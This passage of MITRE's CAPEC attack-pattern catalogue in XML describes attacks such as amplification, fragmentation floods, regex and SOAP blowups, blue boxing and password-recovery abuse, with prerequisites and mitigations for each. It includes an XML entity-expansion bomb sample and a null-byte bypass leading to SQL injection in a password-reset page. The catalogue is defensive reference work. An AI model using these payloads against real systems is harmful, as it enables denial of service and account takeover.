            <Resource>A powerful enough computer for the job with sufficient CPU, RAM and HD. Exact requirements will depend on the size of the brute force job and the time requirement for completion. Some brute forcing jobs may require grid or distributed computing (e.g. DES Challenge).</Resource>
         </Resources_Required>
         <Indicators>
            <Indicator>Many incorrect login attempts are detected by the system.</Indicator>
         </Indicators>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Gain Privileges</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Implement a password throttling mechanism. This mechanism should take into account both the IP address and the log in name of the user.</Mitigation>
            <Mitigation>Put together a strong password policy and make sure that all user created passwords comply with it. Alternatively automatically generate strong passwords for users.</Mitigation>
            <Mitigation>Passwords need to be recycled to prevent aging, that is every once in a while a new password must be chosen.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>
               <xhtml:p>A system does not enforce a strong password policy and the user picks a five letter password consisting of lower case English letters only. The system does not implement any password throttling mechanism. Assuming the adversary does not know the length of the users' password, an adversary can brute force this password in maximum 1+26+26^2+26^3+26^4+26^5 = 1 + 26 + 676 + 17576 + 456976 + 11,881,376 = 12,356,631 attempts, and half these tries (6,178,316) on average. Using modern hardware this attack is trivial. If the adversary were to assume that the user password could also contain upper case letters (and it was case sensitive) and/or numbers, than the number of trials would have been larger.</xhtml:p>
               <xhtml:p>An adversary's job would have most likely been even easier because many users who choose easy to brute force passwords like this are also likely to use a word that can be found in the dictionary. Since there are far fewer valid English words containing up to five letters than 12,356,631, an attack that tries each of the entries in the English dictionary would go even faster.</xhtml:p>
            </Example>
            <Example>A weakness exists in the automatic password generation routine of Mailman prior to 2.1.5 that causes only about five million different passwords to be generated. This makes it easy to brute force the password for all users who decided to let Mailman automatically generate their passwords for them. Users who chose their own passwords during the sign up process would not have been affected (assuming that they chose strong passwords). See also: CVE-2004-1143</Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="521"/>
            <Related_Weakness CWE_ID="262"/>
            <Related_Weakness CWE_ID="263"/>
            <Related_Weakness CWE_ID="257"/>
            <Related_Weakness CWE_ID="693"/>
         </Related_Weaknesses>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <Entry_ID>1110</Entry_ID>
               <Entry_Name>Brute Force</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <Entry_ID>1201</Entry_ID>
               <Entry_Name>Password Policy Discovery</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Attack_Phases, Attack_Prerequisites, Description Summary, Examples-Instances</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Description, Taxonomy_Mappings</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="490" Name="Amplification" Abstraction="Standard" Status="Draft">
         <Description>An adversary may execute an amplification where the size of a response is far greater than that of the request that generates it. The goal of this attack is to use a relatively few resources to create a large amount of traffic against a target server. To execute this attack, an adversary send a request to a 3rd party service, spoofing the source address to be that of the target server. The larger response that is generated by the 3rd party service is then sent to the target server. By sending a large number of initial requests, the adversary can generate a tremendous amount of traffic directed at the target. The greater the discrepancy in size between the initial request and the final payload delivered to the target increased the effectiveness of this attack.</Description>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="125"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>This type of an attack requires the existence of a 3rd party service that generates a response that is significantly larger than the request that triggers it.</Prerequisite>
         </Prerequisites>
         <Mitigations>
            <Mitigation>To mitigate this type of an attack, an organization can attempt to identify the 3rd party services being used in an active attack and blocking them until the attack ends. This can be accomplished by filtering traffic for suspicious message patterns such as a spike in traffic where each response contains the same large block of data. Care should be taken to prevent false positive rates so legitimate traffic isn't blocked.</Mitigation>
         </Mitigations>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="770"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-01-09</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Weaknesses</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="491" Name="XML Quadratic Expansion" Abstraction="Detailed" Status="Draft">
         <Description>An adversary exploits a few properties of XML(substitution entities and inline DTDs) to cause a denial of service situation due to excessive memory being allocated to fully expand the XML. The result of this denial of service could cause the application to freeze or crash.</Description>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="230"/>
            <Related_Attack_Pattern Nature="CanFollow" CAPEC_ID="228"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>This type of attack requires a server that accepts XML data and parses the data.</Prerequisite>
         </Prerequisites>
         <Mitigations>
            <Mitigation>
               <xhtml:p>Design: Use libraries and templates that minimize unfiltered input. Use methods that limit entity expansion and throw exceptions on attempted entity expansion.</xhtml:p>
               <xhtml:p>Implementation: Disable altogether the use of inline DTD schemas in your XML parsing objects. If must use DTD, normalize, filter and white list and parse with methods and routines that will detect entity expansion from untrusted sources.</xhtml:p>
            </Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>
               <xhtml:p>In this example the attacker defines one large entity and refers to it many times.</xhtml:p>
               <xhtml:div style="margin-left:10px;" class="informative">&lt;?xml version="1.0"?&gt;<xhtml:br/>&lt;!DOCTYPE bomb [&lt;!ENTITY x "AAAAA<xhtml:div>
                     <xhtml:i>... [100K of them] ...</xhtml:i>
                  </xhtml:div>
                  <xhtml:br/>AAAA"&gt;]&gt;<xhtml:br/>&lt;boom&gt;<xhtml:div style="margin-left:10px;">&lt;bang&gt;&amp;x;&amp;x;<xhtml:div>
                        <xhtml:i>... [100K of them]...</xhtml:i>
                     </xhtml:div>
                     <xhtml:br/>&amp;x;&amp;x;&lt;/bang&gt;</xhtml:div>
                  <xhtml:br/>&lt;/boom&gt;</xhtml:div>
               <xhtml:p>This results in a relatively small message of 100KBs that will expand to a message in the GB range.</xhtml:p>
            </Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="770"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Weaknesses</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="492" Name="Regular Expression Exponential Blowup" Abstraction="Standard" Status="Draft">
         <Description>An adversary may execute an attack on a program that uses a poor Regular Expression(Regex) implementation by choosing input that results in an extreme situation for the Regex. A typical extreme situation operates at exponential time compared to the input size. This is due to most implementations using a Nondeterministic Finite Automaton(NFA) state machine to be built by the Regex algorithm since NFA allows backtracking and thus more complex regular expressions. The algorithm builds a finite state machine and based on the input transitions through all the states until the end of the input is reached. NFA engines may evaluate each character in the input string multiple times during the backtracking. The algorithm tries each path through the NFA one by one until a match is found; the malicious input is crafted so every path is tried which results in a failure. Exploitation of the Regex results in programs hanging or taking a very long time to complete. These attacks may target various layers of the Internet due to regular expressions being used in validation.</Description>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="130"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>This type of an attack requires the ability to identify hosts running a poorly implemented Regex, and the ability to send crafted input to exploit the regular expression.</Prerequisite>
         </Prerequisites>
         <Mitigations>
            <Mitigation>Test custom written Regex with fuzzing to determine if the Regex is a poor one. Add timeouts to processes that handle the Regex logic. If an evil Regex is found rewrite it as a good Regex.</Mitigation>
         </Mitigations>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="400"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-421"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Weaknesses</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="493" Name="SOAP Array Blowup" Abstraction="Standard" Status="Draft">
         <Description>An adversary may execute an attack on a web service that uses SOAP messages in communication. By sending a very large SOAP array declaration to the web service, the attacker forces the web service to allocate space for the array elements before they are parsed by the XML parser. The attacker message is typically small in size containing a large array declaration of say 1,000,000 elements and a couple of array elements. This attack targets exhaustion of the memory resources of the web service.</Description>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="130"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>This type of an attack requires the attacker to know the endpoint of the web service, and be able to reach the endpoint with a malicious SOAP message.</Prerequisite>
         </Prerequisites>
         <Mitigations>
            <Mitigation>Enforce strict schema validation. The schema should enforce a maximum number of array elements. If the number of maximum array elements can't be limited another validation method should be used. One such method could be comparing the declared number of items in the array with the existing number of elements of the array. If these numbers don't match drop the SOAP packet at the web service layer.</Mitigation>
         </Mitigations>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="770"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-422"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Weaknesses</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="494" Name="TCP Fragmentation" Abstraction="Standard" Status="Draft">
         <Description>An attacker may execute a TCP Fragmentation attack against a target with the intention of avoiding filtering rules. IP fragmentation occurs when an IP datagram is larger than the MTU of the route the datagram has to traverse. The attacker attempts to fragment the TCP packet such that the headers flag field is pushed into the second fragment which typically is not filtered. This behavior defeats some IPS and firewall filters who typically check the FLAGS in the header of the first packet since dropping this packet prevents the following fragments from being processed and assembled. Another variation is overlapping fragments thus that an innocuous first segment passes the filter and the second segment overwrites the TCP header data with the true payload which is malicious in nature. The malicious payload manipulated properly may lead to a DoS due to resource consumption or kernel crash. Additionally the fragmentation could be used in conjunction with sending fragments at a rate slightly slower than the timeout to cause a DoS condition by forcing resources that assemble the packet to wait an inordinate amount of time to complete the task. The fragmentation identification numbers could also be duplicated very easily as there are only 16 bits in IPv4 so only 65536 packets are needed.</Description>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="130"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>This type of an attack requires the target system to be running a vulnerable implementation of IP, and the attacker needs to ability to send TCP packets of arbitrary size with crafted data.</Prerequisite>
         </Prerequisites>
         <Mitigations>
            <Mitigation>This attack may be mitigated by enforcing rules at the router following the guidance of RFC1858. The essential part of the guidance is creating the following rule "IF FO=1 and PROTOCOL=TCP then DROP PACKET" as this mitigated both tiny fragment and overlapping fragment attacks in IPv4. In IPv6 overlapping(RFC5722) additional steps may be required such as deep packet inspection. The delayed fragments may be mitigated by enforcing a timeout on the transmission to receive all packets by a certain time since the first packet is received. According to RFC2460 IPv6 implementations should enforce a rule to discard all fragments if the fragments are not ALL received within 60 seconds of the FIRST arriving fragment.</Mitigation>
         </Mitigations>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="770"/>
            <Related_Weakness CWE_ID="404"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-423"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Weaknesses</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="495" Name="UDP Fragmentation" Abstraction="Standard" Status="Draft">
         <Description>An attacker may execute a UDP Fragmentation attack against a target server in an attempt to consume resources such as bandwidth and CPU. IP fragmentation occurs when an IP datagram is larger than the MTU of the route the datagram has to traverse. Typically the attacker will use large UDP packets over 1500 bytes of data which forces fragmentation as ethernet MTU is 1500 bytes. This attack is a variation on a typical UDP flood but it enables more network bandwidth to be consumed with fewer packets. Additionally it has the potential to consume server CPU resources and fill memory buffers associated with the processing and reassembling of fragmented packets.</Description>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="130"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>This type of an attack requires the attacker to be able to generate fragmented IP traffic containing crafted data.</Prerequisite>
         </Prerequisites>
         <Mitigations>
            <Mitigation>This attack may be mitigated by changing default cache sizes to be larger at the OS level. Additionally rules can be enforced to prune the cache with shorter timeouts for packet reassembly as the cache nears capacity.</Mitigation>
         </Mitigations>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="770"/>
            <Related_Weakness CWE_ID="404"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-424"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Weaknesses</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="496" Name="ICMP Fragmentation" Abstraction="Standard" Status="Draft">
         <Description>An attacker may execute a ICMP Fragmentation attack against a target with the intention of consuming resources or causing a crash. The attacker crafts a large number of identical fragmented IP packets containing a portion of a fragmented ICMP message. The attacker these sends these messages to a target host which causes the host to become non-responsive. Another vector may be sending a fragmented ICMP message to a target host with incorrect sizes in the header which causes the host to hang.</Description>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="130"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>This type of an attack requires the target system to be running a vulnerable implementation of IP, and the attacker needs to ability to send arbitrary sized ICMP packets to the target.</Prerequisite>
         </Prerequisites>
         <Mitigations>
            <Mitigation>This attack may be mitigated through egress filtering based on ICMP payload so a network is a "good neighbor" to other networks. Bad IP implementations become patched, so using the proper version of a browser or OS is recommended.</Mitigation>
         </Mitigations>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="770"/>
            <Related_Weakness CWE_ID="404"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-425"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Weaknesses</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="498" Name="Probe iOS Screenshots" Abstraction="Detailed" Status="Draft">
         <Description>An adversary examines screenshot images created by iOS in an attempt to obtain sensitive information. These images are used by iOS to aid in the visual transition between open applications and improve the user's experience with a device. An application can be at risk even if it properly protects sensitive information when at rest. If the application displays sensitive information on the screen, then the potential exists for iOS to unintentionally record that information in an image file. An adversary can retrieve these images either by gaining access to the image files, or by physically obtaining the device and leveraging the multitasking switcher interface.</Description>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="545"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>This type of an attack requires physical access to a device to either excavate the image files (potentially by leveraging a Jailbreak) or view the screenshots through the multitasking switcher (by double tapping the home button on the device).</Prerequisite>
         </Prerequisites>
         <Mitigations>
            <Mitigation>To mitigate this type of an attack, an application that may display sensitive information should clear the screen contents before a screenshot is taken. This can be accomplished by setting the key window's hidden property to YES. This code to hide the contents should be placed in both the applicationWillResignActive() and applicationDidEnterBackground() methods.</Mitigation>
         </Mitigations>
         <References>
            <Reference External_Reference_ID="REF-426" Section="Chapter 11 : Page 285 : Application Screenshots"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-11-09</Modification_Date>
               <Modification_Comment>Updated Architectural_Paradigms, Related_Attack_Patterns, Technical_Context</Modification_Comment>
            </Modification>
            <Previous_Entry_Name Date="2015-11-09">Probe Application Screenshots</Previous_Entry_Name>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="499" Name="Intent Intercept" Abstraction="Standard" Status="Draft">
         <Description>An adversary, through a previously installed malicious application, intercepts messages from a trusted Android-based application in an attempt to achieve a variety of different objectives including denial of service, information disclosure, and data injection. An implicit intent sent from a trusted application can be received by any application that has declared an appropriate intent filter. If the intent is not protected by a permission that the malicious application lacks, then the attacker can gain access to the data contained within the intent. Further, the intent can be either blocked from reaching the intended destination, or modified and potentially forwarded along.</Description>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="117"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>An adversary must be able install a purpose built malicious application onto the Android device and convince the user to execute it. The malicious application is used to intercept implicit intents.</Prerequisite>
         </Prerequisites>
         <Mitigations>
            <Mitigation>To mitigate this type of an attack, explicit intents should be used whenever sensitive data is being sent. An explicit intent is delivered to a specific application as declared within the intent, whereas the Android operating system determines who receives an implicit intent which could potentially be a malicious application. If an implicit intent must be used, then it should be assumed that the intent will be received by an unknown application and any response should be treated accordingly. Implicit intents should never be used for inter-application communication.</Mitigation>
         </Mitigations>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="925"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-427" Section="3.1 Unauthorized Intent Receipt"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated References, Related_Weaknesses</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="5" Name="Blue Boxing" Abstraction="Detailed" Status="Draft">
         <Description>This type of attack against older telephone switches and trunks has been around for decades. A tone is sent by an adversary to impersonate a supervisor signal which has the effect of rerouting or usurping command of the line. While the US infrastructure proper may not contain widespread vulnerabilities to this type of attack, many companies are connected globally through call centers and business process outsourcing. These international systems may be operated in countries which have not upgraded Telco infrastructure and so are vulnerable to Blue boxing. Blue boxing is a result of failure on the part of the system to enforce strong authorization for administrative functions. While the infrastructure is different than standard current applications like web applications, there are historical lessons to be learned to upgrade the access control for administrative functions.</Description>
         <Likelihood_Of_Attack>Medium</Likelihood_Of_Attack>
         <Typical_Severity>Very High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="220"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>System must use weak authentication mechanisms for administrative functions.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Low">Given a vulnerable phone system, the attackers' technical vector relies on attacks that are well documented in cracker 'zines and have been around for decades.</Skill>
         </Skills_Required>
         <Resources_Required>
            <Resource>CCITT-5 or other vulnerable lines, with the ability to send tones such as combined 2,400 Hz and 2,600 Hz tones to the switch</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Availability</Scope>
               <Impact>Resource Consumption</Impact>
               <Note>Denial of Service</Note>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Gain Privileges</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Implementation: Upgrade phone lines. Note this may be prohibitively expensive</Mitigation>
            <Mitigation>Use strong access control such as two factor access control for administrative access to the switch</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>An adversary identifies a vulnerable CCITT-5 phone line, and sends a combination tone to the switch in order to request administrative access. Based on tone and timing parameters the request is verified for access to the switch. Once the adversary has gained control of the switch launching calls, routing calls, and a whole host of opportunities are available.</Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="285"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-1"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Weaknesses</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="50" Name="Password Recovery Exploitation" Abstraction="Standard" Status="Draft">
         <Description>An attacker may take advantage of the application feature to help users recover their forgotten passwords in order to gain access into the system with the same privileges as the original user. Generally password recovery schemes tend to be weak and insecure. Most of them use only one security question . For instance, mother's maiden name tends to be a fairly popular one. Unfortunately in many cases this information is not very hard to find, especially if the attacker knows the legitimate user. These generic security questions are also re-used across many applications, thus making them even more insecure. An attacker could for instance overhear a coworker talking to a bank representative at the work place and supplying their mother's maiden name for verification purposes. An attacker can then try to log in into one of the victim's accounts, click on "forgot password" and there is a good chance that the security question there will be to provide mother's maiden name. A weak password recovery scheme totally undermines the effectiveness of a strong password scheme.</Description>
         <Likelihood_Of_Attack>Medium</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="212"/>
         </Related_Attack_Patterns>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Explore</Phase>
               <Description>Understand the password recovery mechanism and how it works.</Description>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Exploit</Phase>
               <Description>Find a weakness in the password recovery mechanism and exploit it. For instance, a weakness may be that a standard single security question is used with an easy to determine answer.</Description>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>The system allows users to recover their passwords and gain access back into the system.</Prerequisite>
            <Prerequisite>Password recovery mechanism has been designed or implemented insecurely.</Prerequisite>
            <Prerequisite>Password recovery mechanism relies only on something the user knows and not something the user has.</Prerequisite>
            <Prerequisite>No third party intervention is required to use the password recovery mechanism.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Low">Brute force attack</Skill>
            <Skill Level="Medium">Social engineering and more sophisticated technical attacks.</Skill>
         </Skills_Required>
         <Resources_Required>
            <Resource>For a brute force attack one would need a machine with sufficient CPU, RAM and HD.</Resource>
         </Resources_Required>
         <Indicators>
            <Indicator>Many incorrect attempts to answer the security question.</Indicator>
         </Indicators>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Gain Privileges</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Use multiple security questions (e.g. have three and make the user answer two of them correctly). Let the user select their own security questions or provide them with choices of questions that are not generic.</Mitigation>
            <Mitigation>E-mail the temporary password to the registered e-mail address of the user rather than letting the user reset the password online.</Mitigation>
            <Mitigation>Ensure that your password recovery functionality is not vulnerable to an injection style attack.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>An attacker clicks on the "forgot password" and is presented with a single security question. The question is regarding the name of the first dog of the user. The system does not limit the number of attempts to provide the dog's name. An attacker goes through a list of 100 most popular dog names and finds the right name, thus getting the ability to reset the password and access the system.</Example>
            <Example>
               <xhtml:p>phpBanner Exchange is a PHP script (using the mySQL database) that facilitates the running of a banner exchange without extensive knowledge of PHP or mySQL.</xhtml:p>
               <xhtml:p>A SQL injection was discovered in the password recovery module of the system that allows recovering an arbitrary user's password and taking over his account. The problem is due to faulty input sanitization in the phpBannerExchange, specifically the e-mail address of the user which is requested by the password recovery module.</xhtml:p>
               <xhtml:p>The e-mail address requested by the password recovery module on the resetpw.php page. That e-mail address is validated with the following regular expression:</xhtml:p>
               <xhtml:div style="margin-left:10px;" class="informative">if(!eregi("^[_a-z0-9-]+(\.[_a-z0-9-]+)*@[a-z0-9-]+(\.[a-z0-9-]+)*<xhtml:div style="margin-left:10px;">(\.[a-z]{2,3})$", $email)){</xhtml:div>
               </xhtml:div>
               <xhtml:p>A bug in the implementation of eregi() allows to pass additional character using a null byte "\0". Since eregi() is implemented in C, the variable $email is treated as a zero-terminated string. All characters following the Null Byte will not be recognized by the regular expression. So an e-mail address can be provided that includes the special character " ' " to break the SQL query below (and it will not be rejected by the regular expression because of the null byte trick). So a SQL injection becomes possible:</xhtml:p>
               <xhtml:div style="margin-left:10px;" class="informative">$get_info=mysql_query("select * from banneruser where<xhtml:div style="margin-left:10px;">email='$email' ");</xhtml:div>
               </xhtml:div>
               <xhtml:p>This query will return a non-zero result set even though the email supplied (attacker's email) is not in the database.</xhtml:p>
               <xhtml:p>Then a new password for the user is generated and sent to the $email address, an e-mail address controlled by the attacker. An attacker can then log in into the system.</xhtml:p>See also: CVE-2006-3013</Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="522"/>
            <Related_Weakness CWE_ID="640"/>
            <Related_Weakness CWE_ID="718"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-429"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="500" Name="WebView Injection" Abstraction="Detailed" Status="Draft">
         <Description>An adversary, through a previously installed malicious application, injects code into the context of a web page displayed by a WebView component. Through the injected code, an adversary is able to manipulate the DOM tree and cookies of the page, expose sensitive information, and can launch attacks against the web application from within the web page.</Description>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="253"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>An adversary must be able install a purpose built malicious application onto the device and convince the user to execute it. The malicious application is designed to target a specific web application and is used to load the target web pages via the WebView component. For example, an adversary may develop an application that interacts with Facebook via WebView and adds a new feature that a user desires. The user would install this 3rd party app instead of the Facebook app.</Prerequisite>
         </Prerequisites>
         <Mitigations>
